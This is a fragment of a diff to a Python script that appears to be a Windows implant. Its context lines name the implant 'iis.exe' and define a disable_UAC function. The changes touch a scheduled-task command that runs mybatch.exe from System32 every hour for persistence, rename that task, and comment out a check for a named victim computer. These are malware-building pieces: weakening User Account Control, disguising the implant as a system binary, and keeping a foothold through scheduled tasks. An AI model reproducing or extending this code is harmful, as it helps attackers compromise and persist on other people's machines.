@@ -45,6 +45,7 @@ implantName = 'iis.exe'
 host = ''
 max_port = 1024
 min_port = 1
+debug = 0
 
 def disable_UAC():
     try:
@@ -145,7 +146,7 @@ def computer_Scheduler():
     time.sleep(5)
 
     subprocess.Popen(r"net use Z: /d")
-    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN NothingHere /TR C:\Windows\System32\mybatch.exe")
+    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN MyBatch /TR C:\Windows\System32\mybatch.exe")
 
     time.sleep(5)
 
@@ -188,10 +189,11 @@ if __name__ == '__main__':
             if i == os.environ['COMPUTERNAME']:
                 print ("Computer Name is " + i)
                 #run = 1
-                if i == 'NOTAVICTIM7':
-                    debug = 1
-                else:
-                    debug = 0
+                #if i == 'NOTAVICTIM7':
+                #    debug = 1
+                #else:
+                #    debug = 0
+
             else:
                 pass
 
